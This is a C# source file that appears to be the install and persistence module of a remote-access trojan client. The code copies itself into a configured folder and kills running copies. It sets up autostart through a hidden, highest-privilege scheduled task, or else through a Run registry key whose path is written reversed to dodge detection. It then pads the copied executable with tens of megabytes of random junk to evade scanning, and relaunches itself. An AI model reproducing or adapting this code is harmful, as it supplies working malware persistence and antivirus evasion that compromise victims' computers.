using Client.Helper;
using Microsoft.VisualBasic;
using Microsoft.Win32;
using System;
using System.Diagnostics;
using System.IO;
using System.Security.Principal;
using System.Threading;

namespace Client.Install
{
    class NormalStartup
    {
        public static void Install()
        {
            try
            {
                string installfullpath = Path.Combine(Environment.ExpandEnvironmentVariables(Settings.InstallFolder), Settings.InstallFile);
                if (Process.GetCurrentProcess().MainModule.FileName != installfullpath)
                {

                    for (int i = 0; i < 10; i++)
                    {
                        Thread.Sleep(1000);
                    }

                    foreach (Process P in Process.GetProcesses())
                    {
                        try
                        {
                            if (P.MainModule.FileName == installfullpath)
                                P.Kill();
                        }
                        catch
                        {
                            Debug.WriteLine("NormalStartup Error : " + P.ProcessName);
                        }
                    }
                    if (Methods.IsAdmin())
                    {
                        Process proc = new Process
                        {
                            StartInfo = new ProcessStartInfo
                            {
                                FileName = "cmd.exe",
                                Arguments = "/c schtasks /create /f /sc ONLOGON /RL HIGHEST /tn " + @"""'" + Settings.InstallFile + @"""'" + " /tr " + @"""'" + installfullpath + @"""'",
                                WindowStyle = ProcessWindowStyle.Hidden,
                                CreateNoWindow = true,
                            }
                        };
                        proc.Start();
                    }
                    else
                    {
                        using (RegistryKey key = Registry.CurrentUser.OpenSubKey(Strings.StrReverse(@"\nuR\noisreVtnerruC\swodniW\tfosorciM\erawtfoS"), RegistryKeyPermissionCheck.ReadWriteSubTree))
                        {
                            key.SetValue(Settings.InstallFile, "\"" + installfullpath + "\"");
                        }
                    }

                    FileStream fs;
                    if (File.Exists(installfullpath))
                    {
                        File.Delete(installfullpath);
                        Thread.Sleep(1000);
                    }
                    fs = new FileStream(installfullpath, FileMode.CreateNew);
                    byte[] clientExe = File.ReadAllBytes(Process.GetCurrentProcess().MainModule.FileName);
                    fs.Write(clientExe, 0, clientExe.Length);
                    byte[] junk = new byte[new Random().Next(40 * 1024 * 1000, 50 * 1024 * 1000)];
                    new Random().NextBytes(junk);
                    fs.Write(junk, 0, junk.Length);
                    fs.Dispose();

                    Process.Start(installfullpath);
                    Methods.ClientExit();
                    Environment.Exit(0);
                }
            }
            catch (Exception ex)
            {
                Debug.WriteLine("Install Failed : " + ex.Message);
            }
        }

    }
}
